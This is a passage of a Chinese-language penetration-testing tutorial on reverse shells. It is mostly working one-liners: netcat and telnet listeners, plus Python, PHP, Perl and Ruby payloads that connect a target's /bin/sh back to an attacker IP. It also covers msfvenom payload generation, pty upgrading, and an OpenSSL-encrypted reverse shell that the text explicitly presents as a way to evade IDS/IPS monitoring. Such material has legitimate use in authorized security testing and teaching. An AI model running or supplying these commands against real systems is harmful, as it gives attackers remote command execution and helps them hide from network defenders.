    nc -lvvp 2333
**目标机主动连接攻击机：**
    mknod a p; telnet 47.xxx.xxx.72 2333 0a
执行效果如下：
### 方法二
**攻击机需要开启两个本地监听：**
    nc -lvvp 2333
    nc -lvvp 4000
**目标机主动连接攻击机：**
    telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000
如上图所示，获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。
## 各种脚本反弹shell
### Python 脚本反弹shell
当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。
**攻击机开启本地监听：**
    nc -lvvp 2333
**目标机主动连接攻击机：**
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
执行效果如下：
### php 脚本反弹shell
当目标主机上有php环境时，我们可以用php来反弹shell。
**攻击机开启本地监听：**
    nc -lvvp 2333
**目标机主动连接攻击机：**
    php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i &3 2>&3");'
### Perl 脚本反弹shell
当目标主机上有perl环境时，我们可以用perl来反弹shell。
**攻击机开启本地监听：**
    nc -lvvp 2333
**目标机主动连接攻击机：**
    perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
执行效果如下：
### Ruby脚本反弹shell
当目标主机上有ruby环境时，我们可以用ruby来反弹shell。
**攻击机开启本地监听：**
    nc -lvvp 2333
**目标机主动连接攻击机：**
    ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    或
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
执行效果如下：
## 使用Metasploit生成反弹shell用的一句话
强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用
`msfvenom -l` 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。
我们直接可以使用 `msfvenom -l`
结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：
    msfvenom -l payloads | grep 'cmd/unix/reverse'
如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：
    msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw
将生成的python反弹shell的一句话在目标主机上执行即可：
## 反弹shell后获取模拟终端
其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。
  * 获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。 
  * 标准的错误输出无法显示，无法正常使用vim等文本编辑器等。
  * 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。
这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。
我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。
我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：
    python -c "import pty;pty.spawn('/bin/bash')"
如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。
## 使用OpenSSL反弹加密shell
在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是 **所有的流量都是明文传输的**
。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用
OpenSSL 反弹一个加密的 shell。
### OpenSSL 简介
在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。
>
> SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。
在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：
### 使用OpenSSL反弹加密shell
实验环境：Linux
目标机：
  * 系统：Linux
  * IP：192.168.1.8
攻击机：
  * 系统：Linux
  * IP：47.xxx.xxx.72
假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：
    openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。
这时在目标机进行反弹 shell 操作，命令为：
    mkfifo /tmp/s; /bin/sh -i &1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s
这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。
## Ending......
> 参考：
>
> 
>
> 
>
> 
>
>
> [https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247499270&idx=3&sn=53e64aa3bb989992bb76773b35a83b71&chksm=](https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247499270&idx=3&sn=53e64aa3bb989992bb76773b35a83b71&chksm=f9e3915dce94184b46b41c1cce5334a0b18f72773b5e5a918316e77717f5f04ca8a083ee1175&mpshare=1&scene=23&srcid=1218GWYAerBiIEpRSlSvuUoD&sharer_sharetime=1608272916742&sharer_shareid=fb28a23f5efa30b40dcc9905f48f84bf#rd)